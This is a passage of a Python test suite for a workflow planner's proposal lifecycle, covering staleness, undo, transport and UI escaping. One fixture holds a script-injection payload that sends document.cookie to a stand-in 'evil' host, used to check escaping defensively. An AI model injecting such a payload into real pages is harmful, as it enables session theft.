    with pytest.raises(aaw_bridge.BridgeError) as exc:
        bridge.accept_proposal(proposal_id)
    assert exc.value.code == aaw_bridge.PROPOSAL_UNKNOWN
    assert snapshot(path) == before


def test_rejecting_an_accepted_proposal_is_refused_rather_than_pretended(planner):
    bridge, path = planner
    frame = plan(bridge, SLICE_A)
    bridge.accept_proposal(frame["proposal"]["proposal_id"], persist=True)
    after = snapshot(path)
    with pytest.raises(aaw_bridge.BridgeError) as exc:
        bridge.reject_proposal(frame["proposal"]["proposal_id"])
    assert exc.value.code == aaw_bridge.PROPOSAL_ALREADY_RESOLVED
    assert snapshot(path) == after


# ══════════════════ 7. staleness ══════════════════

def test_slice_c_a_stale_proposal_is_refused_with_zero_mutation(planner):
    """Slice C. Generate, move the real graph, Accept → PROPOSAL_STALE."""
    bridge, path = planner
    frame = plan(bridge, SLICE_A)
    generated_against = frame["base_semantic_hash"]

    # the operator edits the real workflow before deciding
    definition = bridge.load_workflow(WORKFLOW_ID)["definition"]
    next(n for n in definition["nodes"] if n["id"] == "N02")["effort"] = "max"
    bridge.save_workflow(WORKFLOW_ID, definition, base_semantic_hash=generated_against)
    moved = snapshot(path)
    assert moved[1] != generated_against

    with pytest.raises(aaw_bridge.BridgeError) as exc:
        bridge.accept_proposal(frame["proposal"]["proposal_id"], persist=True)

    assert exc.value.code == aaw_bridge.PROPOSAL_STALE
    assert "three-way merge" in str(exc.value)
    assert snapshot(path) == moved, "a stale Accept mutated the workflow"
    assert bridge.proposal(frame["proposal"]["proposal_id"])["status"] == pp.PROPOSAL_STALE
    assert pp.is_stale(json.loads(path.read_text(encoding="utf-8")), frame["proposal"])
    # and it stays refused
    with pytest.raises(aaw_bridge.BridgeError) as exc:
        bridge.accept_proposal(frame["proposal"]["proposal_id"])
    assert exc.value.code == aaw_bridge.PROPOSAL_NOT_ACCEPTABLE
    assert snapshot(path) == moved


def test_a_layout_only_change_does_not_make_a_proposal_stale(planner):
    """Staleness is semantic, exactly like the save path's own stale check."""
    bridge, path = planner
    frame = plan(bridge, SLICE_A)
    bridge.save_layout(WORKFLOW_ID, {"nodes": {"N01": {"x": 999, "y": -40}}})
    report = bridge.accept_proposal(frame["proposal"]["proposal_id"], persist=True)
    assert report["status"] == pp.PROPOSAL_ACCEPTED


def test_staleness_is_remeasured_on_every_read(planner):
    bridge, _ = planner
    frame = plan(bridge, SLICE_A)
    proposal_id = frame["proposal"]["proposal_id"]
    assert bridge.proposal(proposal_id)["stale"] is False
    assert bridge.list_proposals(WORKFLOW_ID)["proposals"][0]["stale"] is False

    definition = bridge.load_workflow(WORKFLOW_ID)["definition"]
    definition["nodes"][1]["effort"] = "low"
    bridge.save_workflow(WORKFLOW_ID, definition)
    assert bridge.proposal(proposal_id)["stale"] is True
    assert bridge.list_proposals(WORKFLOW_ID)["proposals"][0]["stale"] is True


def test_a_proposal_survives_a_browser_refresh(planner):
    """§18: the canvas loses its reference on reload; the bridge does not."""
    bridge, path = planner
    before = snapshot(path)
    frame = plan(bridge, SLICE_A)

    # everything the reloaded canvas has is the workflow id
    listing = bridge.list_proposals(WORKFLOW_ID)
    assert [row["proposal_id"] for row in listing["proposals"]] == \
        [frame["proposal"]["proposal_id"]]
    assert listing["proposals"][0]["stale"] is False
    reattached = bridge.proposal(frame["proposal"]["proposal_id"])
    assert reattached["status"] == pp.PROPOSAL_READY
    assert reattached["preview"]["projection"]["nodes"]
    assert snapshot(path) == before                    # a refresh changes nothing


# ══════════════════ 8. the vertical slices ══════════════════

def test_slice_a_a_simple_linear_extension(planner):
    """Slice A: existing node → Plan from here → research → review → continue."""
    bridge, path = planner
    before = snapshot(path)
    frame = plan(bridge, SLICE_A, instruction="add a research pass before review")
    assert frame["status"] == pp.PROPOSAL_READY, frame["errors"]
    assert frame["summary"]["node_count"] == 2
    assert frame["summary"]["assumptions"] == ["The research belongs on the main path, not a branch."]

    report = bridge.accept_proposal(frame["proposal"]["proposal_id"], persist=True)
    after = json.loads(path.read_text(encoding="utf-8"))
    projection = rc.workflow_projection(after)
    route = {edge["edge_id"]: (edge["from"], edge["to"]) for edge in projection["edges"]}
    assert route["E_N01_P01"] == ("N01", "P01")
    assert route["E_P01_P02"] == ("P01", "P02")
    assert route["E_P02_N02"] == ("P02", "N02")
    assert "E_N01_CONTINUE" not in route
    assert report["semantic_hash"] != before[1]
    p01 = next(n for n in after["nodes"] if n["id"] == "P01")
    assert p01["role"] == "RESEARCH_SYNTHESIZER" and p01["effort"] == "medium"
    assert p01["on_pass"] is None and p01["on_fail"] is None


def test_slice_b_a_branch_and_merge_proposal(planner):
    """Slice B: one source → two branches → MERGE ALL_REQUIRED → REVIEW."""
    bridge, path = planner
    frame = plan(bridge, SLICE_B, instruction="fan out, then rejoin")
    assert frame["status"] == pp.PROPOSAL_READY, frame["errors"]

    report = bridge.accept_proposal(frame["proposal"]["proposal_id"], persist=True)
    after = json.loads(path.read_text(encoding="utf-8"))
    workflow_schema.validate_workflow(after)               # the real contract, again

    anchor = next(n for n in after["nodes"] if n["id"] == "N01")
    assert anchor["routing"] == "ALL_MATCHES"
    assert {edge["to"] for edge in anchor["edges"]} == {"B01", "B02"}

    merge = next(n for n in after["nodes"] if n["id"] == "M01")
    assert merge["type"] == "MERGE"
    assert merge["merge_policy"] == "ALL_REQUIRED"
    assert merge["model"] is None                          # a MERGE binds no model
    # the closed incoming contract holds exactly
    arriving = {edge["edge_id"] for node in after["nodes"]
                for edge in node.get("edges", []) if edge["to"] == "M01"}
    assert arriving == set(merge["expected_incoming"]) == {"E_B01_M01", "E_B02_M01"}

    projection = rc.workflow_projection(after)
    merge_row = next(row for row in projection["nodes"] if row["node_id"] == "M01")
    assert merge_row["is_merge"] is True
    assert report["added_node_ids"] == ["B01", "B02", "M01", "R01"]


def test_an_accepted_proposal_is_one_coherent_undo_transaction(planner):
    """§17, driven through the real `draft_history.js` the canvas loads.

    One Undo must take the entire accepted subgraph back out, and one Redo
    must bring all of it back — not one step per proposed node.
    """
    bridge, _ = planner
    base = bridge.load_workflow(WORKFLOW_ID)["definition"]
    frame = plan(bridge, SLICE_B)
    accepted = bridge.accept_proposal(frame["proposal"]["proposal_id"], persist=False)

    program = r"""
const { DraftHistory } = require(process.argv[1]);
const assert = require('node:assert/strict');
const payload = JSON.parse(require('node:fs').readFileSync(process.argv[2], 'utf8'));

const h = new DraftHistory(100);
let state = { draft: payload.before, layout: { nodes: { N01: {x:0,y:0}, N02: {x:300,y:0} } } };
h.reset(state);
assert.equal(h.canUndo(), false);

// exactly what `acceptProposal` does on the canvas: replace the draft with the
// candidate the bridge returned, add the ghost positions, and record ONE step.
state = { draft: payload.after, layout: { nodes: Object.assign(
  {}, state.layout.nodes, payload.ghosts) } };
h.record(state, payload.label);

assert.equal(h.undoStack.length, 1, 'an accepted proposal must be ONE undo step');
const undone = h.undo();
assert.deepEqual(undone.state.draft, payload.before, 'Undo must revert the whole subgraph');
assert.deepEqual(Object.keys(undone.state.layout.nodes).sort(), ['N01', 'N02']);
assert.equal(h.canUndo(), false, 'there is nothing else to undo');

const redone = h.redo();
assert.deepEqual(redone.state.draft, payload.after, 'Redo must restore the whole subgraph');
assert.deepEqual(Object.keys(redone.state.layout.nodes).sort(),
                 ['B01', 'B02', 'M01', 'N01', 'N02', 'R01']);
assert.equal(h.canRedo(), false);
console.log('ACCEPTED_PROPOSAL_IS_ONE_TRANSACTION');
"""
    payload = {
        "before": base, "after": accepted["candidate"],
        "label": accepted["undo_label"],
        "ghosts": {node_id: {"x": 600 + 300 * index, "y": 100 * index}
                   for index, node_id in enumerate(accepted["added_node_ids"])},
    }
    data = Path(planner[1]).with_name("undo_payload.json")
    data.write_text(json.dumps(payload), encoding="utf-8")
    completed = subprocess.run(["node", "-e", program, str(HISTORY_JS), str(data)],
                               shell=False, capture_output=True, text=True, check=False)
    assert completed.returncode == 0, completed.stderr
    assert completed.stdout.strip() == "ACCEPTED_PROPOSAL_IS_ONE_TRANSACTION"


# ══════════════════ 9. existing runtime is unaffected ══════════════════

def test_a_run_of_the_extended_workflow_still_executes(planner, tmp_path):
    """The graph a planner extended is an ordinary graph to the runner."""
    bridge, path = planner
    frame = plan(bridge, SLICE_A)
    bridge.accept_proposal(frame["proposal"]["proposal_id"], persist=True)

    repo, worktree = _workspace(tmp_path / "ws")
    script = {"delay_seconds": 0.0,
              "nodes": {"*": {"outcome": "PASS", "verdict": "PASS", "summary": "scripted"}}}
    started = bridge.start_run(WORKFLOW_ID, goal="run the extended graph", repo=repo,
                              worktree=worktree,
                              adapter=aaw_llm_test_adapter.scripted_adapter(script))
    since, collected = 0, []
    deadline = time.monotonic() + 180
    while time.monotonic() < deadline:
        batch = bridge.events(started["run_id"], since=since)
        for event in batch["events"]:
            since = int(event["sequence"])
            collected.append(event)
        if batch["lifecycle"] == aaw_bridge.RUN_SETTLED:
            collected.extend(bridge.events(started["run_id"], since=since)["events"])
            break
        time.sleep(0.05)
    else:
        raise AssertionError("the extended workflow did not settle")

    completed = [row["node_id"] for row in collected
                 if row["event_type"] == rc.NODE_COMPLETED]
    assert completed[:3] == ["N01", "P01", "P02"], collected
    state = bridge.run_state(started["run_id"])
    assert state["status"] in {"WAITING_FOR_HUMAN", "COMPLETED"}
    # the run never saw a proposal
    assert not any("PROPOSAL" in str(row.get("event_type")) for row in collected)


def test_planning_during_a_run_is_a_read_and_accept_is_the_only_refusal(planner, tmp_path):
    bridge, path = planner
    repo, worktree = _workspace(tmp_path / "ws")
    script = {"delay_seconds": 2.0,
              "nodes": {"*": {"outcome": "PASS", "verdict": "PASS", "summary": "scripted"}}}
    started = bridge.start_run(WORKFLOW_ID, goal="hold", repo=repo, worktree=worktree,
                              adapter=aaw_llm_test_adapter.scripted_adapter(script))
    try:
        before = snapshot(path)
        frame = plan(bridge, SLICE_A)
        assert frame["status"] == pp.PROPOSAL_READY     # reading is always allowed
        assert snapshot(path) == before
    finally:
        bridge.cancel_run(started["run_id"], join_timeout=20.0)


# ══════════════════ 10. the event contract ══════════════════

def test_the_planner_journal_is_structured_and_sequenced(planner):
    bridge, _ = planner
    frame = plan(bridge, SLICE_A)
    bridge.accept_proposal(frame["proposal"]["proposal_id"], persist=True)
    rejected = plan(bridge, SLICE_A)                     # now stale, but still stored
    if rejected["status"] == pp.PROPOSAL_READY:
        bridge.reject_proposal(rejected["proposal"]["proposal_id"])

    events = bridge.planner_events()["events"]
    sequences = [row["sequence"] for row in events]
    assert sequences == sorted(sequences) == list(range(1, len(events) + 1))
    for row in events:
        assert row["event_type"] in pp.PLANNER_EVENT_TYPES
        assert row["contract"] == pp.PROPOSAL_CONTRACT
        assert row["at"]
    types = [row["event_type"] for row in events]
    assert types[:4] == [pp.PLANNER_STARTED, pp.PLANNER_COMPLETED,
                         pp.PROPOSAL_READY, pp.PROPOSAL_ACCEPTED]
    accepted = next(row for row in events if row["event_type"] == pp.PROPOSAL_ACCEPTED)
    assert accepted["previous_semantic_hash"] != accepted["semantic_hash"]
    assert accepted["added_node_ids"] == ["P01", "P02"]

    # `since` is a resumable cursor, exactly like the routing journal's
    tail = bridge.planner_events(since=2)
    assert [row["sequence"] for row in tail["events"]] == sequences[2:]


def test_the_journal_records_the_planner_identity_and_input_hash(planner):
    bridge, _ = planner
    frame = plan(bridge, SLICE_A)
    started = bridge.planner_events()["events"][0]
    completed = bridge.planner_events()["events"][1]
    assert started["input_hash"] == frame["input_hash"]
    assert started["base_semantic_hash"] == frame["base_semantic_hash"]
    assert completed["planner"]["invocation"] == "PLANNER_PROPOSAL"
    assert completed["planner"]["adapter"] == scripted.SCRIPT_SCHEMA_VERSION
    assert completed["planner"]["telemetry_status"] == "SYNTHETIC_NO_PROVIDER_CALL"


def test_the_wire_contract_declares_the_planner(planner):
    contract = aaw_bridge.public_contract()
    assert contract["proposal_statuses"] == list(pp.PROPOSAL_STATUSES)
    assert set(contract["planner_event_types"]) == set(pp.PLANNER_EVENT_TYPES)
    assert "plan_from_node" in contract["planner"]
    assert "planner graph mutation" not in contract["deferred"]
    assert "planner Modify" in contract["deferred"]
    assert contract["planner_contract"]["node_types"] == list(pp.PROPOSAL_NODE_TYPES)
    assert "MACHINE_GATE" not in contract["planner_contract"]["node_types"]
    assert contract["planner_contract"]["limits"]["max_nodes"] > 0


# ══════════════════ 11. transport ══════════════════

def test_the_planner_round_trip_works_over_the_real_transport(planner, tmp_path):
    import urllib.error
    import urllib.request

    bridge, path = planner
    server = aaw_bridge_server.serve(
        port=0, bridge=bridge,
        planner_adapter=scripted.scripted_planner(SLICE_A))
    base_url = f"http://127.0.0.1:{server.server_address[1]}"

    def post(route, payload):
        request = urllib.request.Request(
            base_url + route, data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"}, method="POST")
        with urllib.request.urlopen(request, timeout=30) as response:
            return json.loads(response.read().decode("utf-8"))

    def get(route):
        with urllib.request.urlopen(base_url + route, timeout=30) as response:
            return json.loads(response.read().decode("utf-8"))

    try:
        before = snapshot(path)
        status = get("/api/planner/status")
        assert status["contract"] == pp.PROPOSAL_CONTRACT

        frame = post("/api/planner/plan",
                     {"workflow_id": WORKFLOW_ID, "anchor_node_id": "N01",
                      "instruction": "over the wire"})
        assert frame["status"] == pp.PROPOSAL_READY
        assert snapshot(path) == before

        listed = get(f"/api/planner/proposals?workflow_id={WORKFLOW_ID}")
        assert [row["proposal_id"] for row in listed["proposals"]] == \
            [frame["proposal"]["proposal_id"]]
        assert get("/api/planner/events?since=0")["count"] >= 3

        # the graph moves under the open proposal: a stale accept comes back as
        # a conflict, not a bad request, and writes nothing
        definition = bridge.load_workflow(WORKFLOW_ID)["definition"]
        next(n for n in definition["nodes"] if n["id"] == "N02")["effort"] = "low"
        bridge.save_workflow(WORKFLOW_ID, definition)
        moved = snapshot(path)
        with pytest.raises(urllib.error.HTTPError) as exc:
            post("/api/planner/accept", {"proposal_id": frame["proposal"]["proposal_id"],
                                         "persist": True})
        assert exc.value.code == 409
        assert json.loads(exc.value.read().decode("utf-8"))["error"] == pp.PROPOSAL_STALE
        assert snapshot(path) == moved

        # regenerated against the graph as it now is, the same plan applies
        again = post("/api/planner/plan",
                     {"workflow_id": WORKFLOW_ID, "anchor_node_id": "N01"})
        assert again["status"] == pp.PROPOSAL_READY
        accepted = post("/api/planner/accept",
                        {"proposal_id": again["proposal"]["proposal_id"], "persist": True})
        assert accepted["status"] == pp.PROPOSAL_ACCEPTED
        assert snapshot(path)[1] == accepted["semantic_hash"]
    finally:
        server.shutdown()


# ══════════════════ 12. the frozen UI, minimally extended ══════════════════

def test_the_canvas_exposes_the_planner_minimally(planner):
    canvas = LIVE_CANVAS.read_text(encoding="utf-8")
    for element_id in ("plGo", "plInstr", "propAccept", "propReject", "propTitle"):
        assert element_id in canvas, element_id
    assert "Plan from here" in canvas
    for route in ("/api/planner/plan", "/api/planner/accept", "/api/planner/reject",
                  "/api/planner/proposals"):
        assert route in canvas
    # §15: no dashboard, no sidebar, no console, no new global navigation
    for forbidden in ("planner-dashboard", "plannerSidebar", "plannerPanel",
                      "planner-console", "id=\"nav\""):
        assert forbidden not in canvas, forbidden
    # the proposal strip reuses the existing controls and tokens
    assert canvas.count('<div id="prop"') == 1
    assert "class=\"btn sm ok\" id=\"propAccept\"" in canvas
    assert "@keyframes" not in canvas.split("#prop{")[1].split("}")[0]


def test_proposed_state_is_visually_distinct_from_every_runtime_state(planner):
    """§16: a ghost must not be readable as idle, waiting, repair, minted or merge."""
    canvas = LIVE_CANVAS.read_text(encoding="utf-8")
    assert ".node[data-proposed=true]{border-style:dotted" in canvas
    assert 'data-v="PROPOSED"' in canvas
    assert ".wire[data-s=proposed]" in canvas
    # dotted is used by nothing else; every other node state is solid or dashed
    for other in ("data-s=cancelled", "data-tmpl=true", "data-reset=true"):
        rule = canvas.split(f".node[{other}]")[1].split("}")[0]
        assert "dotted" not in rule, f"{other} also uses a dotted border"
    # a proposed node cannot be wired: its ports are not rendered
    assert ".node[data-proposed=true] .port{display:none}" in canvas


def test_proposal_text_reaches_the_canvas_only_through_escaping(planner):
    """§22: planner prose is untrusted, and the canvas renders it escaped."""
    canvas = LIVE_CANVAS.read_text(encoding="utf-8")
    section = canvas[canvas.index("function clearProposal()"):
                     canvas.index("async function saveWorkflow()")]
    # Every interpolation that reaches innerHTML is either escaped or a count.
    statements = re.findall(r"innerHTML\s*=(.*?);\n", section, re.S)
    assert statements, "paintProposal no longer writes any HTML; re-point this test"
    for statement in statements:
        for interpolation in re.findall(r"\$\{([^}]*)\}", statement):
            assert "esc(" in interpolation or interpolation.strip().endswith(".length"), (
                "unescaped proposal interpolation reaches innerHTML: " + interpolation)
        for call in re.findall(r"\.map\(\((\w+)\)", statement):
            assert "esc(" in statement, call
    # the two fields carrying the most planner prose are plain text, not HTML
    assert '$("#propMeta").textContent' in canvas
    assert '$("#propTitle").textContent' in canvas
    # and the node body a ghost draws goes through the same `esc` every node does
    assert "esc(firstLine(node.instructions))" in canvas


def test_a_proposal_carrying_markup_is_stored_verbatim_and_refused_nothing(planner):
    """The contract does not sanitise prose; it forbids control characters and
    caps length, and rendering safety is escaping. Both are checked here."""
    bridge, _ = planner
    payload = "<script>fetch('http://evil/'+document.cookie)</script>"
    script = _slice_a_with(lambda e: e["nodes"][0].__setitem__("instructions", payload))
    frame = plan(bridge, script)
    assert frame["status"] == pp.PROPOSAL_READY
    assert frame["proposal"]["nodes"][0]["instructions"] == payload   # verbatim, not mangled
    report = bridge.accept_proposal(frame["proposal"]["proposal_id"])
    stored = next(n for n in report["candidate"]["nodes"] if n["id"] == "P01")
    assert stored["instructions"] == payload


def test_the_proposal_strip_owns_its_own_clicks():
    """Regression from the browser walkthrough: Accept and Reject did nothing.

    `#prop` lives inside `#stage`, and the stage's `pointerdown` handler falls
    through to the pan branch for anything it does not recognise — which takes
    pointer capture and means the overlay's buttons never receive a `click` at
    all. Every overlay inside the stage has to be named in that guard.
    """
    canvas = LIVE_CANVAS.read_text(encoding="utf-8")
    guard = canvas[canvas.index('stage.addEventListener("pointerdown"'):]
    guard = guard[:guard.index("const port = ev.target.closest")]
    for overlay in ("#insp", "#palette", "#warn", "#menu", "#prop"):
        assert f'closest("{overlay}")' in guard, f"{overlay} does not own its own clicks"


def test_the_committed_slice_fixture_validates():
    definition = json.loads((HERE / "WORKFLOWS" / "PLANNER_SLICE_V1.json")
                            .read_text(encoding="utf-8"))
    workflow_schema.validate_workflow(definition)
    anchor = next(n for n in definition["nodes"] if n["id"] == "N01")
    # the fixture exists to exercise the splice case: one unconditional edge out
    assert [e["when"] for e in anchor["edges"]] == [None]


def test_the_canvas_still_calls_only_routes_the_transport_serves():
    canvas = LIVE_CANVAS.read_text(encoding="utf-8")
    served = set(re.findall(r'route == "(/api/[a-z/\-]+)"',
                            Path(aaw_bridge_server.__file__).read_text(encoding="utf-8")))
    called = {match.group(1) for match in re.finditer(r'api\("(/api/[a-z/\-]+)', canvas)}
    assert {"/api/planner/plan", "/api/planner/accept"} <= called
    assert called <= served, sorted(called - served)


# AAW PLANNER LIVE PROVIDER VALIDATION V0.2. Every codex-harness live call
# failed dispatch (`invalid_json_schema`) until `proposal_output_schema`'s
# `required` matched the property set of every one of its objects, because
# OpenAI's structured-output strict mode -- not this contract -- requires
# that. This walks the schema recursively so the class of defect cannot come
# back silently; it is not a claim about this contract's own optionality
# rules, which stay enforced, unweakened, in `_validate_nodes`/`_validate_edges`.
def _schema_types(node):
    kind = node.get("type")
    return {kind} if isinstance(kind, str) else set(kind or ())


def _assert_strict_schema(node, *, path=""):
    if not isinstance(node, dict):
        return
    if "object" in _schema_types(node) or "properties" in node:
        properties = node.get("properties", {})
        assert node.get("additionalProperties") is False, \
            f"{path or '<root>'}: object schema needs additionalProperties: false"
        assert set(node.get("required") or ()) == set(properties), \
            (f"{path or '<root>'}: required {sorted(node.get('required') or ())} must "
             f"equal properties {sorted(properties)}")
        for key, sub in properties.items():
            _assert_strict_schema(sub, path=f"{path}.{key}")
    if "array" in _schema_types(node) and "items" in node:
        assert "type" in node["items"], f"{path}[]: every schema node needs a type"
        _assert_strict_schema(node["items"], path=f"{path}[]")


def test_the_planner_output_schema_satisfies_openai_strict_mode():
    _assert_strict_schema(aaw_planner.proposal_output_schema())


def test_a_null_valued_predicate_key_is_the_same_as_an_absent_one(planner):
    """A provider whose structured-output mode requires every declared object
    property to be present (§ aaw_planner.proposal_output_schema) cannot emit
    a `when` with only the one predicate key it means -- it must supply all
    of PREDICATE_KEYS and null the rest. Without normalization the real
    validator reads a present-but-null key as an asserted (and invalid)
    predicate, refusing an otherwise-legal proposal for a representation
    artifact. This is AAW_PLANNER_LIVE_PROVIDER_VALIDATION_V0.2 evidence:
    every live case with a conditional edge failed this way before the fix."""
    bridge, _ = planner
    script = _slice_a_with(lambda e: e["edges"][0].__setitem__(
        "when", {"verdict": "PASS", "outcome": None, "has_findings": None,
                 "min_severity": None}))
    frame = plan(bridge, script)
    assert frame["status"] == pp.PROPOSAL_READY, frame.get("diagnostics")
    # The stored *proposal* is the planner's content verbatim -- normalize_proposal
    # alters nothing the planner said, so the nulls are still there.
    raw_edge = next(e for e in frame["proposal"]["edges"] if e["edge_id"] == "E_N01_P01")
    assert raw_edge["when"] == {"verdict": "PASS", "outcome": None,
                                "has_findings": None, "min_severity": None}
    report = bridge.accept_proposal(frame["proposal"]["proposal_id"])
    stored_edge = next(e for n in report["candidate"]["nodes"] if n["id"] == "N01"
                       for e in n["edges"] if e["edge_id"] == "E_N01_P01")
    assert stored_edge["when"] == {"verdict": "PASS"}


def test_edge_kind_stays_a_plain_enum_not_a_nullable_one():
    """`kind` must never offer null: the real validator only defaults a
    *missing* kind to CONTINUE (`edge.get("kind", "CONTINUE")`), so a schema
    that let a provider return an explicit null would earn every such edge a
    spurious refusal instead of the CONTINUE the provider expected."""
    edge_schema = aaw_planner.proposal_output_schema()["properties"]["edges"]["items"]
    assert edge_schema["properties"]["kind"] == {"enum": list(rc.EDGE_KINDS)}
